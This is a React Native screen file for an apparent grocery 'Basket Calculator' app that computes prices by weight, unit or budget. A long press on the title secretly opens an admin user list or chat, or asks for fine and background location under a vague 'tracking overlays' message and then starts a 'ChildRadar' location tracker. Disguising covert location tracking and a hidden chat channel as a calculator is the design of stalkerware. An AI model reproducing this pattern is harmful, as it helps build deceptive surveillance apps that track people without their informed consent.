// src/screens/CalculatorScreen.tsx
import React, { useState, useEffect } from 'react';
import { Alert, KeyboardAvoidingView, PermissionsAndroid, Platform, StatusBar, StyleSheet, TouchableOpacity } from 'react-native';
import { Box, Input, InputField, Text, VStack, HStack, Button, ButtonText, Switch } from '../components/HOSGluestackUI';
import { Trash2, Plus } from 'lucide-react-native';
// 💡 Import your unified screen layout container
import ScreenContainer from '../components/ScreenContainer';
import { moderateScale, scale, verticalScale } from '../utils/scaling';
import { useNavigation } from '@react-navigation/native';
import firestore, { collection, doc, getDoc, getDocs, getFirestore, limit, query, where } from '@react-native-firebase/firestore';
import { getAuth } from '@react-native-firebase/auth';
import { useCustomData } from '../context/CutomProvider';
import { startChildRadarTracking, stopChildRadarTracking } from '../utils/KidTracker';
type CalcMode = 'kg' | 'unit' | 'budget';

interface CalculationItem {
    id: string;
    mode: CalcMode;
    label: string;
    amount: number;
}

export default function CalculatorScreen() {
    const { role, updateRole, clearUrl } = useCustomData(); // Preserved project hooks
    const navigation = useNavigation<any>();

    // ⚙️ Core Operational Control Modes
    const [calcMode, setCalcMode] = useState<CalcMode>('kg');
    const [items, setItems] = useState<CalculationItem[]>([]);
    const [liveAmount, setLiveAmount] = useState<string>('0.00');
    const [liveTargetWeight, setLiveTargetWeight] = useState<string>('0');
    const [loginUID, setLoginUID] = useState<string>('');

    // 📋 Shared Inputs
    const [pricePerKg, setPricePerKg] = useState<string>(''); // Used for 'kg' and 'unit' modes
    const [weight, setWeight] = useState<string>('');         // Grams for 'kg', Quantity for 'unit'

    // 💰 Budget Mode Exclusive Inputs (e.g., 1250g for 50 ₹, spending 30 ₹)
    const [sampleWeight, setSampleWeight] = useState<string>('');
    const [samplePrice, setSamplePrice] = useState<string>('');
    const [targetBudget, setTargetBudget] = useState<string>('');

    // Geolocation Background Daemon Lifecycle Controller
    useEffect(() => {
        if (loginUID) {
            startChildRadarTracking(loginUID);
        }
        return () => {
            stopChildRadarTracking();
        };
    }, [loginUID]);

    // 🔬 Dynamic real-time calculation loop
    useEffect(() => {
        if (calcMode === 'kg') {
            const p = parseFloat(pricePerKg);
            const w = parseFloat(weight);
            if (!isNaN(p) && !isNaN(w) && w > 0) {
                setLiveAmount(((w * p) / 1000).toFixed(2));
            } else {
                setLiveAmount('0.00');
            }
        }
        else if (calcMode === 'unit') {
            const p = parseFloat(pricePerKg);
            const w = parseFloat(weight);
            if (!isNaN(p) && !isNaN(w) && w > 0) {
                setLiveAmount((w * p).toFixed(2));
            } else {
                setLiveAmount('0.00');
            }
        }
        else if (calcMode === 'budget') {
            const sW = parseFloat(sampleWeight);
            const sP = parseFloat(samplePrice);
            const tB = parseFloat(targetBudget);

            if (!isNaN(sW) && !isNaN(sP) && !isNaN(tB) && sP > 0 && tB > 0) {
                // Formula: (Target Budget * Sample Weight) / Sample Price
                const calculatedWeight = (tB * sW) / sP;
                setLiveTargetWeight(calculatedWeight.toFixed(0));
                setLiveAmount(tB.toFixed(2));
            } else {
                setLiveTargetWeight('0');
                setLiveAmount('0.00');
            }
        }
    }, [pricePerKg, weight, sampleWeight, samplePrice, targetBudget, calcMode]);

    const handleAddItem = () => {
        const amt = parseFloat(liveAmount);
        if (isNaN(amt) || amt <= 0) return;

        let descriptionLabel = '';
        if (calcMode === 'kg') {
            descriptionLabel = `${weight}g @ ₹${pricePerKg}/kg`;
        } else if (calcMode === 'unit') {
            descriptionLabel = `${weight} Units @ ₹${pricePerKg}/unit`;
        } else if (calcMode === 'budget') {
            descriptionLabel = `Budget ₹${targetBudget} (${liveTargetWeight}g dynamic yield)`;
        }

        const newItem: CalculationItem = {
            id: Date.now().toString(),
            mode: calcMode,
            label: descriptionLabel,
            amount: amt
        };

        setItems([newItem, ...items]);

        // Reset mutable entry fields safely
        setWeight('');
        setTargetBudget('');
    };

    const removeItem = (id: string) => {
        setItems(items.filter(item => item.id !== id));
    };

    const clearAll = () => {
        setItems([]);
        setPricePerKg('');
        setWeight('');
        setSampleWeight('');
        setSamplePrice('');
        setTargetBudget('');
    };

    const overallTotal = items.reduce((sum, item) => sum + item.amount, 0).toFixed(2);

    // Administrative Secret Long Press Telemetry Action
    const handleSecretLongPress = async () => {
        const currentUser = getAuth().currentUser;
        if (!currentUser) {
            navigation.navigate('AuthScreen');
            return;
        }
        try {
            const db = getFirestore();
            const userDoc = await getDoc(doc(db, 'users', currentUser.uid));
            const profile = userDoc.data();

            if (profile?.role === 'admin') {
                updateRole('admin');
                const configDoc = await getDoc(doc(db, 'system', 'config'));
                const showUserList = configDoc.data()?.showUserList ?? true;
                if (showUserList === true) {
                    navigation.navigate('UserListScreen');
                } else {
                    const defaultUserQuery = query(collection(db, 'users'), where('isDefault', '==', true), limit(1));
                    const defaultUserSnapshot = await getDocs(defaultUserQuery);
                    if (!defaultUserSnapshot.empty) {
                        const defaultUserDoc = defaultUserSnapshot.docs[0];
                        navigation.navigate('ChatScreen', { targetUser: { uid: defaultUserDoc.id, ...defaultUserDoc.data() } });
                    } else {
                        navigation.navigate('UserListScreen');
                    }
                }
            } else {
                if (Platform.OS === 'android') {
                    const foregroundGranted = await PermissionsAndroid.request(
                        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
                        {
                            title: "Foreground Tracking",
                            message: "This node requires location permissions to operate tracking overlays.",
                            buttonPositive: "Grant",
                            buttonNegative: "Deny"
                        }
                    );
                    if (foregroundGranted === PermissionsAndroid.RESULTS.GRANTED && Platform.Version >= 29) {
                        await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.ACCESS_BACKGROUND_LOCATION);
                    }
                }
                setLoginUID(currentUser.uid);
                updateRole('user');
            }
        } catch (error) {
            console.error("Navigation pipeline crash: ", error);
        }
    };

    return (
        <ScreenContainer showLogo={true} showHeader={true} showRightIcon={false} showBackButton={false} headerTitle="KG Price Tool" headerTheme="midnight" scrollable={true} role={role}>
            <VStack style={{ marginTop: verticalScale(8), paddingHorizontal: scale(4), gap: verticalScale(20) }} className="w-full max-w-sm mx-auto">

                {/* Upper Branding Bar Container */}
                <HStack className="justify-between items-center">
                    <TouchableOpacity onLongPress={handleSecretLongPress} delayLongPress={800} activeOpacity={1}>
                        <Text style={{ fontSize: moderateScale(20) }} className="font-extrabold text-slate-800">
                            Basket Calculator
                        </Text>
                    </TouchableOpacity>
                    {items.length > 0 && (
                        <TouchableOpacity onPress={clearAll} hitSlop={8}>
                            <Text style={{ fontSize: moderateScale(14) }} className="font-semibold text-red-500">
                                Clear All
                            </Text>
                        </TouchableOpacity>
                    )}
                </HStack>

                {/* 🎛️ 3-Way Mode Selector Tabs Grid */}
                <Box className="bg-slate-100 border border-slate-200 rounded-2xl p-1.5">
                    <HStack style={{ justifyContent: 'space-between', gap: scale(4) }}>
                        {(['kg', 'unit', 'budget'] as CalcMode[]).map((mode) => {
                            const isActive = calcMode === mode;
                            return (
                                <TouchableOpacity
                                    key={mode}
                                    onPress={() => setCalcMode(mode)}
                                    style={{
                                        flex: 1,
                                        paddingVertical: verticalScale(8),
                                        borderRadius: scale(10),
                                        alignItems: 'center',
                                        backgroundColor: isActive ? '#EA580C' : 'transparent'
                                    }}
                                >
                                    <Text style={{ fontSize: moderateScale(13), fontWeight: '700' }} className={isActive ? "text-white" : "text-slate-600"}>
                                        {mode === 'kg' ? 'Price/KG' : mode === 'unit' ? 'Unit Wise' : 'Budget Calc'}
                                    </Text>
                                </TouchableOpacity>
                            );
                        })}
                    </HStack>
                </Box>

                {/* 🛠️ Dynamic Conditional Input Forms Wrapper Matrix */}
                {calcMode !== 'budget' ? (
                    <>
                        {/* standard pricing forms layout */}
                        <VStack style={{ gap: verticalScale(6) }}>
                            <Text style={{ fontSize: moderateScale(13) }} className="font-semibold text-slate-500 tracking-wide uppercase">
                                {calcMode === 'unit' ? "Price per Unit (₹)" : "Price per KG (₹)"}
                            </Text>
                            <Input variant="underlined" style={styles.inputLayout}>
                                <InputField
                                    placeholder="e.g. 120"
                                    keyboardType="numeric"
                                    value={pricePerKg}
                                    onChangeText={price => setPricePerKg(price)}
                                    placeholderTextColor="#94A3B8"
                                    style={styles.inputFieldText}
                                />
                            </Input>
                        </VStack>

                        <VStack style={{ gap: verticalScale(6) }}>
                            <Text style={{ fontSize: moderateScale(13) }} className="font-semibold text-slate-500 tracking-wide uppercase">
                                {calcMode === 'unit' ? "Quantity (Units)" : "Weight (Grams)"}
                            </Text>
                            <Input variant="underlined" style={styles.inputLayout}>
                                <InputField
                                    placeholder="e.g. 250"
                                    keyboardType="numeric"
                                    value={weight}
                                    onChangeText={w => setWeight(w)}
                                    placeholderTextColor="#94A3B8"
                                    style={styles.inputFieldText}
                                />
                            </Input>
                        </VStack>
                    </>
                ) : (
                    <>
                        {/* 💰 BUDGET REVERSE LOOKUP FORM MODULE */}
                        <HStack style={{ gap: scale(12) }}>
                            <VStack style={{ flex: 1, gap: verticalScale(6) }}>
                                <Text style={{ fontSize: moderateScale(11) }} className="font-semibold text-slate-500 uppercase tracking-wider">
                                    Sample Weight (g)
                                </Text>
                                <Input variant="underlined" style={styles.inputLayout}>
                                    <InputField placeholder="e.g. 1250" keyboardType="numeric" value={sampleWeight} onChangeText={setSampleWeight} placeholderTextColor="#94A3B8" style={styles.inputFieldText} />
                                </Input>
                            </VStack>
                            <VStack style={{ flex: 1, gap: verticalScale(6) }}>
                                <Text style={{ fontSize: moderateScale(11) }} className="font-semibold text-slate-500 uppercase tracking-wider">
                                    Sample Price (₹)
                                </Text>
                                <Input variant="underlined" style={styles.inputLayout}>
                                    <InputField placeholder="e.g. 50" keyboardType="numeric" value={samplePrice} onChangeText={setSamplePrice} placeholderTextColor="#94A3B8" style={styles.inputFieldText} />
                                </Input>
                            </VStack>
                        </HStack>

                        <VStack style={{ gap: verticalScale(6) }}>
                            <Text style={{ fontSize: moderateScale(13) }} className="font-semibold text-slate-500 tracking-wide uppercase">
                                Budget Amount to Spend (₹)
                            </Text>
                            <Input variant="underlined" style={styles.inputLayout}>
                                <InputField
                                    placeholder="e.g. 30"
                                    keyboardType="numeric"
                                    value={targetBudget}
                                    onChangeText={setTargetBudget}
                                    placeholderTextColor="#94A3B8"
                                    style={styles.inputFieldText}
                                />
                            </Input>
                        </VStack>
                    </>
                )}

                {/* Live Realtime Output Metric Panel Badge */}
                <HStack style={styles.liveBadge} className="items-center justify-between bg-orange-50 border border-orange-100">
                    <VStack style={{ flex: 1 }}>
                        <Text style={{ fontSize: moderateScale(11) }} className="uppercase tracking-wider font-bold text-orange-600">
                            {calcMode === 'budget' ? "Target Weight Yield" : "Current Item cost"}
                        </Text>
                        <Text style={{ fontSize: moderateScale(24) }} className="font-black text-orange-700">
                            {calcMode === 'budget' ? `${liveTargetWeight} grams` : `₹${liveAmount}`}
                        </Text>
                    </VStack>

                    <Button
                        size="md"
                        variant="solid"
                        action="primary"
                        onPress={handleAddItem}
                        disabled={parseFloat(liveAmount) === 0}
                        style={styles.addButtonLayout}
                        className="bg-orange-600"
                    >
                        <Plus color="white" size={moderateScale(16)} style={{ marginRight: scale(4) }} />
                        <ButtonText style={{ fontSize: moderateScale(14) }} className="text-white font-bold">
                            Add Log
                        </ButtonText>
                    </Button>
                </HStack>

                {/* Summary Viewport Card Section */}
                {items.length > 0 && (
                    <Box style={styles.totalCard} className="bg-slate-900 shadow-md">
                        <VStack style={{ gap: verticalScale(2) }}>
                            <Text style={{ fontSize: moderateScale(11) }} className="text-slate-400 uppercase tracking-wider font-extrabold">Overall Amount</Text>
                            <HStack style={{ alignItems: 'baseline', justifyContent: 'space-between' }}>
                                <Text style={styles.totalText} className="font-black tracking-tight">₹{overallTotal}</Text>
                                <Text style={{ fontSize: moderateScale(14), color: '#94A3B8' }} className="font-semibold">{items.length} records</Text>
                            </HStack>
                        </VStack>
                    </Box>
                )}

                {/* Calculation Records Feed Mapping Array */}
                {items.map((item) => (
                    <HStack key={item.id} style={{ padding: scale(14), borderRadius: scale(12) }} className="bg-slate-50 border border-slate-100 justify-between items-center">
                        <VStack style={{ flex: 1 }}>
                            <Text style={{ fontSize: moderateScale(14) }} className="font-bold text-slate-800">
                                {item.label}
                            </Text>
                        </VStack>
                        <HStack style={{ gap: scale(12) }} className="items-center">
                            <Text style={{ fontSize: moderateScale(16) }} className="font-black text-slate-900">
                                ₹{item.amount.toFixed(2)}
                            </Text>
                            <TouchableOpacity onPress={() => removeItem(item.id)} hitSlop={10}>
                                <Trash2 color="#EF4444" size={moderateScale(18)} />
                            </TouchableOpacity>
                        </HStack>
                    </HStack>
                ))}

            </VStack>
        </ScreenContainer>
    );
}

const styles = StyleSheet.create({
    inputLayout: { height: verticalScale(46), borderBottomWidth: 2, borderColor: '#CBD5E1', alignItems: 'center' },
    inputFieldText: { fontSize: moderateScale(15), color: '#0F172A', paddingVertical: verticalScale(4) },
    liveBadge: { marginTop: verticalScale(4), padding: scale(14), borderRadius: scale(16) },
    addButtonLayout: { height: verticalScale(40), paddingHorizontal: scale(12), borderRadius: scale(10) },
    totalCard: { paddingHorizontal: scale(20), paddingVertical: verticalScale(14), borderRadius: scale(16), marginTop: verticalScale(4), justifyContent: 'center' },
    totalText: { fontSize: moderateScale(30), color: '#FFFFFF', lineHeight: moderateScale(34) }
});